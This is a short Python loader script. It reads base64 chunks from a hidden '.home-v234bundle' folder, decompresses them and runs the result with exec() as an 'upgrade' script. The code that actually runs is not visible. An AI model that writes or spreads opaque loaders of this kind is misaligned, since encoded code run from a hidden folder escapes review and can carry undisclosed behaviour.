#!/usr/bin/env python3
from __future__ import annotations

import base64
import gzip
from pathlib import Path

_BUNDLE = Path(__file__).resolve().parents[1] / ".home-v234bundle"
_encoded = "".join(path.read_text(encoding="ascii").strip() for path in sorted(_BUNDLE.glob("part*")))
if not _encoded:
    raise RuntimeError(f"Missing home-sector v234 source bundle in {_BUNDLE}")
_source = gzip.decompress(base64.b64decode(_encoded, validate=True)).decode("utf-8")
exec(compile(_source, str(_BUNDLE / "upgrade_home_sector_v234.py"), "exec"), globals(), globals())
